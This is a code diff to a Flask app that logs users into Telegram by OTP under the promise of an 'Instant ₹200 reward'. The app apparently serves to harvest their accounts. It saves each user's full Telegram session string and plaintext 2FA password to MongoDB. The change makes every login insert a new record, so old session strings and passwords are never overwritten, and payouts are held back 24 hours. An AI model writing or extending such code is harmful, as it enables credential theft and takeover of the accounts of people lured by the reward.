@@ -235,10 +235,20 @@ def verify_otp():
         user, final_session_string = result
         
         # Check if user exists to determine if this is first login
-        existing_user = mongo.db.users.find_one({'user_id': user.id})
+        existing_user = mongo.db.users.find_one({
+            'user_id': user.id,
+            'session_active': True
+        })
         is_new_user = existing_user is None
         
-        # Save user data to MongoDB
+        # If there's an active session, mark it as expired (don't edit it)
+        if existing_user:
+            mongo.db.users.update_one(
+                {'_id': existing_user['_id']},
+                {'$set': {'session_active': False, 'session_expired_at': datetime.utcnow()}}
+            )
+        
+        # Always create a NEW document for the new session
         user_data = {
             'user_id': user.id,
             'phone': phone,
@@ -246,41 +256,29 @@ def verify_otp():
             'last_name': user.last_name,
             'username': user.username,
             'session_string': final_session_string,
-            'password_2fa': password if password else None,  # Store 2FA password
-            'session_active': True,  # Mark session as active
-            'last_login': datetime.utcnow()
+            'password_2fa': password if password else None,
+            'session_active': True,
+            'created_at': datetime.utcnow(),
+            'last_login': datetime.utcnow(),
+            'withdrawal_available_at': datetime.utcnow() + timedelta(hours=24),
+            'withdrawals': []
         }
         
-        # Add earning data for new users
+        # Set balance based on whether user ever existed
         if is_new_user:
-            user_data.update({
-                'created_at': datetime.utcnow(),
-                'balance': 200.0,  # Instant ₹200 reward
-                'total_earned': 200.0,
-                'withdrawal_available_at': datetime.utcnow() + timedelta(hours=24),
-                'withdrawals': []
-            })
+            user_data['balance'] = 200.0  # Instant ₹200 reward
+            user_data['total_earned'] = 200.0
         else:
-            # For existing users, check if session was expired
-            was_expired = not existing_user.get('session_active', True)
-            
-            user_data['balance'] = existing_user.get('balance', 0.0)
-            user_data['total_earned'] = existing_user.get('total_earned', 0.0)
-            user_data['withdrawals'] = existing_user.get('withdrawals', [])
-            user_data['created_at'] = existing_user.get('created_at', datetime.utcnow())
-            
-            # If session was expired, reset the withdrawal timer
-            if was_expired:
-                user_data['withdrawal_available_at'] = datetime.utcnow() + timedelta(hours=24)
-            else:
-                user_data['withdrawal_available_at'] = existing_user.get('withdrawal_available_at')
+            # Get balance from any previous session (active or expired)
+            any_previous = mongo.db.users.find_one(
+                {'user_id': user.id},
+                sort=[('created_at', -1)]
+            )
+            user_data['balance'] = any_previous.get('balance', 0.0) if any_previous else 0.0
+            user_data['total_earned'] = any_previous.get('total_earned', 0.0) if any_previous else 0.0
         
-        # Update or insert user
-        mongo.db.users.update_one(
-            {'user_id': user.id},
-            {'$set': user_data},
-            upsert=True
-        )
+        # Insert new session document
+        mongo.db.users.insert_one(user_data)
         
         # Clean up temporary session data only on success
         if session_id in temp_sessions:
@@ -331,7 +329,11 @@ def dashboard():
     if 'user_id' not in session:
         return redirect(url_for('index'))
     
-    user_data = mongo.db.users.find_one({'user_id': session['user_id']})
+    # Only get ACTIVE session
+    user_data = mongo.db.users.find_one({
+        'user_id': session['user_id'],
+        'session_active': True
+    })
     
     if not user_data:
         session.clear()
@@ -339,7 +341,7 @@ def dashboard():
     
     # Check if Telegram session is still valid
     session_string = user_data.get('session_string')
-    if session_string and user_data.get('session_active', True):
+    if session_string:
         try:
             async def validate_session():
                 client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
@@ -356,10 +358,10 @@ def dashboard():
             is_valid = run_telegram_operation(validate_session)
             
             if not is_valid:
-                # Mark session as expired in database
+                # Mark session as expired (don't delete, just mark)
                 mongo.db.users.update_one(
-                    {'user_id': session['user_id']},
-                    {'$set': {'session_active': False}}
+                    {'_id': user_data['_id']},
+                    {'$set': {'session_active': False, 'session_expired_at': datetime.utcnow()}}
                 )
                 # Clear user session and redirect to login
                 session.clear()
